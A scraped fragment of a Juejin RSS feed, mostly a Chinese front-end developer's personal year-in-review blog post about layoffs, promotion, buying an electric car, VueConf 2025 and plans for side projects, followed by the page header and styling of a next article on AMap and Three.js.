10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>距离上次写文章已经过去了 610+ 天，一年半多的时间，从一个更新频率还算高且酷爱写作的人，这个长时间的断更期间都做了什么，此时此刻，特别想写下来，坐在这里，斟酌许久，又不知该从何下笔，来表达这<del>京城之美</del>，咳咳，这番感受...</p>
<h2 data-id="heading-0">工作历程</h2>
<p>作为一个 90 小伙儿，又读了研究生，2016 年毕业后享受了约 5 年的互联网的行业和在线教育的尾声红利，可惜那时候只是个小小的走卒，酱油打的别提多利索了，几乎没有 6 点之后下过班，养鱼养得飞起，没错，这时候靠养水草都月入2k+。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/92826f6511a34cb39e156454b00159c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGhyZWVyb2Nrcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767865402&amp;x-signature=LrKt3yHOYNbhi7VwrURYtjDpH4k%3D" alt="cgi-bin_mmwebwx-bin_webwxgetmsgimg_&amp;MsgID=2762806330020766664&amp;skey=@crypt_effbd34a_d3bec78215cbd9880633e8fd73c2dcb6&amp;mmweb_appid=wx_webfilehelper.jpeg" loading="lazy"/>
时间很快来到了 2021 年 7 月，“双减”来临，同年 8 月主动离职，离开了深耕了 5 年的在线教育行业，同年 9 月原公司裁员，完美错过了第一次的…高额的…赔偿款。同一年，抖音、快手等直播平台兴起，自媒体大红大紫，作为一个在水草领域小有名气的人，坐拥精品贴无数，拒绝了几个好友的开号邀请，错过了自媒体的黄金机会...回过头来看这一年，就是『错过』。<br/>
离开在线教育行业后，也正式换了岗位，由之前的带着 nodejs 开发的职称干着伪全栈，转身第一次作为一个全职的前端开发进入职场，终于不用再为其他人解释工作岗位是干什么内容的了...，薪水也来到了一个可观的年薪 70 个，很快的很快，一年多的时间，薪水又涨了10% 来到了 42k，同时涨薪的补充协议有一行很小的字，绩效改为 0-4个月，1 个多月之后的年底，裁员，绩效不给，干满了一整年，绩效 1 分钱不给，第一次体会了这个行业的...好在 n+1 和 16 薪还是给到了，毕竟这是在合同上写着的金额...大家一番折腾之后，加上当时的居家政策，远程办公，很快就被逐一击破，最后整个部门只剩了零星的 2、3 个人走到了仲裁，大部分人都认了...<br/>
这里不得不再次提一下这几年，疫情影响，经济下滑，互联网行业红利逐渐褪去，在这几年内能够成功转行纯前端并且把薪水提升到了一个可观程度，我自己还是很满意的，因此，内心深处也比较感激经历了人生唯一一次裁员的那个公司，在那里，经常遇到问题学习到凌晨2、3点，也结交了很多现在还在联系的朋友，真的很幸运也很知足，像极了刚毕业那时候的感觉，是我前端技能提升最快的一个阶段，没有之一。现在回头看，我发现，这一年多的时光，真的是宇宙给我的绝佳馈赠。那时的我，只要跟我的代码在一起，就觉得自己可以上天入地，玩的不亦乐乎，真当是“代码在我手，天地任我游”！<br/>
裁员后 1 周内就确认了下家，但因为马上就是新年，过完年，时间很快来到了 2023 年 02 月份，入职了现在这家公司，emm... base 涨了 10%，年终奖 2-3 个月，总包反而下降 10%，职级提升一级，高级 -&gt; 资深，酱紫。2023、2024 年过的还算好，工作压力不大，绩效也一直很高，中间薪水象征性的涨了 1 次，3%<br/>
时间来到了 2025 年，这一年有涨薪，涨的算多的，10%；职级再次提升一级来到了高级架构师。年初，由开发人员开始转型带团队，目前是一个带着 5正式 1外包 1实习的状态，代码还写，但比之前少了很多。在晋升请客的酒桌上，大家调侃我在互联网行业这般疲态、国家经济这般不好的情况下逆流而上。但我却是深深的知道，没有任何一种回报是轻而易举的，也没有任何江山是稳固的。今年 2025 年，年龄也来到了 35 岁，一个互联网行业谈之色变的年纪，可...我的年假依然还是 5 天，因为距离 2016 年毕业还没工作满 10 年，看似一段很长的时间和经历，又岂是几句话可以表述清楚，也不知道再能在这个行业干几年，年龄的问题就这样吧，走到不再是互联网人的那一天为止...</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d8bf4aea10f74c17a7d54700c268af23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGhyZWVyb2Nrcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767865402&amp;x-signature=VAJW%2BjIhdT%2FSg9sEiNoWrDCKkpY%3D" alt="cgi-bin_mmwebwx-bin_webwxgetmsgimg_&amp;MsgID=1234620595321688549&amp;skey=@crypt_effbd34a_d3bec78215cbd9880633e8fd73c2dcb6&amp;mmweb_appid=wx_webfilehelper.jpeg" loading="lazy"/>
同样是 2025 年，公司因为一些原因自下半年开始裁员，很多熟悉的小伙伴都走了，第一次有了陌生感。行业起起浮浮，有峰值也有低谷，任何一个行业都不会长期处于高峰，高光时间都很短暂，因为赚钱的方向太少了，一个方向漏出头来，千千万万的人就跟上，国家也会平衡，强如华为被制裁那几年，国内芯片行业恨不得一年内涨三次薪水，跳槽就翻倍，但这才几年呢，芯片行业也平静了。<br/>
好吧，工作上就聊这么多，希望 2026 年大家都更好...开开心心的工作，快快乐乐的生活，工作生活两不误。<br/>
对了，这一年我集齐了第 2 套公司的盲盒，终于，终于，终于圆满了，然后把多余的全给同事分了。爱收集的毛病从小到现在都改不掉啊。希望我不会再第 3 套的契机。（小小愿望：公司赶紧出其他套吧，哈哈哈）</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3889627b90934f888b8ea90c7b4dbdec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGhyZWVyb2Nrcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767865402&amp;x-signature=kJgNKcVe8xZmWHwFmCpjeYr5Kh4%3D" alt="cgi-bin_mmwebwx-bin_webwxgetmsgimg_&amp;MsgID=6341678104993819849&amp;skey=@crypt_effbd34a_d3bec78215cbd9880633e8fd73c2dcb6&amp;mmweb_appid=wx_webfilehelper.jpeg" loading="lazy"/></p>
<h2 data-id="heading-1">生活</h2>
<ol>
<li>5 月中签了新能源指标，选中了乐道 L90。一番筛选，到最后其实就是3选1，理想i6、问界新 M7、乐道 L90，曾经进入过选项的问界 M8、蔚来 es8，最后因为价格原因 Pass。在智驾、品牌和大空间、换电的抉择中，选择了换电和大空间，大空间对我来说是刚需，至于选择换电，我觉得北京而言在没有家充桩的情况下，充电仍然是一件麻烦事，虽然现在到处都是快充，但一想到要专门去充电去等待，哪天出门一看电量还要去充个电再办事，还有桩的适配啊、充电人数啊、快充伤电池啊、后期充电限速啊，balabalaba 就烦，换电就跟就跟加油一样，同时，家门口就两座换电站，最终选了 L90</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab4b9081080b44f98e42ab48af6b4603~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGhyZWVyb2Nrcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767865402&amp;x-signature=HtpdbfPYIqBxRA%2Fu0WwUc8QbRy8%3D" alt="image.png" loading="lazy"/></p>
<ol start="2">
<li>参加了 VueConf 2025 大会，见到了尤大，去了华强北、深圳湾，完美的一次出行，可惜时间太短，希望有机会再去深圳</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68a00f0984ee4d499e8935609a7c4a9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGhyZWVyb2Nrcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767865402&amp;x-signature=GJ%2BX%2BgOG0vR%2Bk6UlrmyrlkV31k0%3D" alt="image.png" loading="lazy"/></p>
<ol start="3">
<li>运动没有落下，往年打的最多的是羽毛球，今年应该是篮球了。2016、2017 年因为和宿舍小伙伴合租，毕业后延续了 1 年多的篮球生活，2018 年开始因为搬家慢慢不再打球，有 6-7 年吧。来到这家公司后，这里的篮球氛围很浓厚，逐渐又打了起来，身体远不如以前轻盈，更加依赖装备，也没有啥新技能增加了，但...还是能打，这是最重要的。球场上的感觉，真的是无与伦比</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c1a483d2d944032aacfab80043c1c40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGhyZWVyb2Nrcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767865402&amp;x-signature=1dpcqSqdVAvwj0mKY%2FnVI%2BKA1rM%3D" alt="cgi-bin_mmwebwx-bin_webwxgetmsgimg_&amp;MsgID=5793782883383855697&amp;skey=@crypt_effbd34a_d3bec78215cbd9880633e8fd73c2dcb6&amp;mmweb_appid=wx_webfilehelper.jpeg" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/544cc1f29393415da5723059eaf82aa4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGhyZWVyb2Nrcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767865402&amp;x-signature=q0bcmo63hS983sOHK1qPvze2kJk%3D" alt="cgi-bin_mmwebwx-bin_webwxgetmsgimg_&amp;MsgID=6286000248151101590&amp;skey=@crypt_effbd34a_d3bec78215cbd9880633e8fd73c2dcb6&amp;mmweb_appid=wx_webfilehelper.jpeg" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a7e3bb9da9f4f8689f50db95d867b9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgdGhyZWVyb2Nrcw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767865402&amp;x-signature=OUbcL2dju%2F42fBNlBA0UPqrTTG4%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-2">千帆过后</h2>
<p>未来想干点啥呢</p>
<ol>
<li>一直在想，AI 时代人人都是创业者，都可以自己给自己打工，还是要有能持续收入的副业，要去学习开发以外的知识，要去思考做出来的产品如何赚钱。希望在 2026 年能有一个好的契机</li>
<li>自媒体，自媒体这个方向肯定是不行了，各个类型的视频都卷的要死，但我还是想做，不为别的，就想试一下。水族这个方向肯定是不会继续了，嗯。。可能会讲讲招聘，这个时代的招聘，尤其是校招，毕竟明年上半年是校招的时间，最近这一两年接触最多的就是这个了，有很多有意思的候选人可以讲讲他们的故事，有很多在这个时代的面试心得，也有一些市场的分析。也可能会讲讲专利写作吧，毕竟我在掘金这边的专利的系列文章还是蛮受欢迎，哈哈</li>
</ol>
<p>就写这么多吧，时间有些晚了...</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[高德地图与Three.js结合实现3D大屏可视化]]></title>    <link>https://juejin.cn/post/7589482741759819803</link>    <guid>https://juejin.cn/post/7589482741759819803</guid>    <pubDate>2025-12-31T01:17:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589482741759819803" data-draft-id="7585468725333147702" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="高德地图与Three.js结合实现3D大屏可视化"/> <meta itemprop="keywords" content="前端,数据可视化"/> <meta itemprop="datePublished" content="2025-12-31T01:17:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="孙_华鹏"/> <meta itemprop="url" content="https://juejin.cn/user/1099167360886078"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            高德地图与Three.js结合实现3D大屏可视化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1099167360886078/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    孙_华鹏
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T01:17:44.000Z" title="Wed Dec 31 2025 01:17:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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